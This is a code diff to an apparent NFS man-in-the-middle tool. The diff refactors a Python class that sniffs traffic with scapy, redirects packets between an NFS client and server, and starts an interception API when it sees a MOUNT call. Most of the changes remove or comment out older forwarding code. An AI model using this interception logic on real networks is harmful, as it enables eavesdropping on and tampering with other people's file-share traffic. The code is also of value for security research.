@@ -82,36 +82,12 @@ class MitmForwarder:
 		# create thread for python socket to "accept" messages
 		threading.Thread(target=self.tcp_listen, args=('', self.target_port)).start()
 
-		# listen with scapy to actually forward and
+		# listen with scapy to actually forward and process
 		str_filter = "tcp and port " + str(self.target_port)
 		sniff(filter=str_filter, prn=self.transfer_tcp)
 
-	# server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-	# server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-	# server_socket.bind(('', self.target_port))
-	# server_socket = StreamSocket(server_socket)
-	#
-	# while True:
-	# 	# accept connection from client
-	# 	local_socket, local_address = server_socket.recv()
-	# 	self.update_spoof_address(local_address[0])
-	#
-	# 	# create remote socket to connect to server
-	# 	remote_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-	# 	remote_socket.bind(('', local_address[1]))
-	# 	remote_socket.connect((self.server_address, self.target_port))
-	# 	remote_socket = StreamSocket(remote_socket)
-	#
-	# 	# create threads for each direction
-	# 	s = threading.Thread(target=self.transfer_tcp, args=(remote_socket, local_socket))
-	# 	r = threading.Thread(target=self.transfer_tcp, args=(local_socket, remote_socket))
-	# 	s.start()
-	# 	r.start()
-
 	def tcp_listen(self, host, port):
 		sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-		print("HOST: " + str(host))
-		print("PORT: " + str(port))
 		sock.bind(('', port))
 		if host == '':  # server
 			sock.listen()
@@ -123,8 +99,10 @@ class MitmForwarder:
 			sock.recv(64512)
 
 	def transfer_tcp(self, pkt):
+		if Ether in pkt:
+			pkt[Ether].checksum = None  # ask scapy to regenerate
 		if IP in pkt:  # only process packets with IP layer
-			pkt[IP].checksum = None  # ask scapy to regenerate it
+			pkt[IP].checksum = None  # ask scapy to regenerate
 			if Ether in pkt:
 				pkt[Ether].checksum = None  # ask scapy to regenerate it
 			print_packet_transfer(TCP, pkt)
@@ -136,14 +114,6 @@ class MitmForwarder:
 				pkt.dst = hex(int(ipaddress.IPv4Address(self.client_address)))
 				print("\t - forwarding to " + str(self.client_address))
 			sr1(pkt)
-
-	# listens for tcp connections and forwards data from src socket to dst socket
-	# @staticmethod
-	# def transfer_tcp(src, dst):
-	# 	while True:
-	# 		data = src.recv(64512)
-	# 		print("[+ TCP ] " + tuple_to_addr(src.getpeername()) + " >>> " + tuple_to_addr(dst.getpeername()) + " [" + str(len(data)) + "]")
-	# 		dst.send(data)
 
 	# ==================== UDP FORWARDING ==================== #
 
@@ -197,80 +167,45 @@ class MitmForwarder:
 		data, address = src.recv(65412)
 		dst.send(data)
 
-	# # ==================== PACKET FORWARDING ==================== #
-	#
-	# # create tcp servers to listen for and forward connections to target
-	# def packet_listen(self, protocol):
-	# 	# socket to actually accept connections on localhost:target_port
-	# 	if protocol == TCP:
-	# 		server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-	# 	else:
-	# 		server_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-	# 	print("[* INF ] starting " + protocol_str(protocol) + " socket on port " + str(self.target_port))
-	# 	server_socket.bind(('', self.target_port))
-	# 	stream_socket = StreamSocket(server_socket)
-	#
-	# 	while True:
-	# 		print("===========================================")
-	#
-	# 		packet_filter_str = protocol_str(protocol) + " and port " + str(self.target_port)
-	# 		pkt = stream_socket.sniff(count=0, filter=packet_filter_str)[0]
-	# 		print("pkt: " + str(pkt))
-	#
-	# 		if IP in pkt:  # only process packets with IP layer
-	# 			pkt[IP].checksum = None  # ask scapy to regenerate it
-	# 			if Ether in pkt:
-	# 				pkt[Ether].checksum = None  # ask scapy to regenerate it
-	# 			print_packet_transfer(TCP, pkt)
-	# 			self.update_client_address(pkt)
-	# 			if pkt[IP].src != self.server_address:  # packet is NOT from server -> forward to target
-	# 				pkt.dst = hex(int(ipaddress.IPv4Address(self.server_address)))
-	# 				print("\t - forwarding to " + str(self.server_address))
-	# 			else:  # packets is from server -> forward to client
-	# 				pkt.dst = hex(int(ipaddress.IPv4Address(self.client_address)))
-	# 				print("\t - forwarding to " + str(self.client_address))
-	# 			stream_socket.send(pkt)
-	# 		print("===========================================")
-
 	# ==================== PACKET FILTERING ==================== #
 
 	# filter packets for data of interest - i.e., mount port and mount path
-	def filter_packets(self, data, remote_ip):
-		port = self.filter_mount_port(data)
-		if port != -1 and port not in self.mount_ports:
-			print("[* INF ] starting forwarders on port " + str(port))
-			_thread.start_new_thread(MitmForwarder, (remote_ip, port))
-			_thread.start_new_thread(MitmForwarder, (remote_ip, port, True))
-			self.mount_ports.append(port)
+	def filter_packets(self, pkt, remote_ip):
+		# port = self.filter_mount_port(pkt)
+		# if port != -1 and port not in self.mount_ports:
+		# 	print("[* INF ] starting forwarders on port " + str(port))
+		# 	_thread.start_new_thread(MitmForwarder, (remote_ip, port))
+		# 	_thread.start_new_thread(MitmForwarder, (remote_ip, port, True))
+		# 	self.mount_ports.append(port)
 
 		# filter path, start mitm API
-		path = self.filter_mount_path(data)
-		if path != -1:
+		path = self.filter_mount_path(pkt)
+		if path != -1:  # if proper mount path, start API on path for clients
 			print("[* INF ] starting NFS MITM API on path \'" + path + "\'")
 			_thread.start_new_thread(NfspionageApi, (remote_ip, path))
 
-	@staticmethod
-	def filter_mount_port(data):
-		try:  # get port number from last few bytes
-			sz = len(data)
-			x = data[sz - 2:sz]
-			tmp = x.hex()
-			port = int(tmp, 16)
+	# @staticmethod
+	# def filter_mount_port(pkt):
+	# 	try:  # get port number from last few bytes
+	# 		sz = len(data)
+	# 		x = data[sz - 2:sz]
+	# 		tmp = x.hex()
+	# 		port = int(tmp, 16)
+	#
+	# 		if port != 0 and port > 100:
+	# 			print("[* INF ] MOUNT on port " + str(port))
+	# 			return port
+	# 		else:
+	# 			return -1
+	# 	except Exception as e:  # error getting mount port
+	# 		str("[- EXP ] " + str(e))
+	# 		return -1
 
-			if port != 0 and port > 100:
-				print("[* INF ] MOUNT on port " + str(port))
-				return port
-			else:
-				return -1
-		except Exception as e:  # error getting mount port
-			str("[- EXP ] " + str(e))
-			return -1
-
 	@staticmethod
-	def filter_mount_path(data):
+	def filter_mount_path(pkt):
 		try:  # try to convert to MOUNT_Call packet
-			mnt_pckt = RPC(MOUNT_Call(raw(data)))
-			path = mnt_pckt.path.path.decode('utf-8')
+			mnt_pkt = RPC(MOUNT_Call(raw(pkt)))
+			path = mnt_pkt.path.path.decode('utf-8')
 			print("[* INF ] MOUNT on path " + path)
 			return path
 		except Exception as e:  # error getting mount path
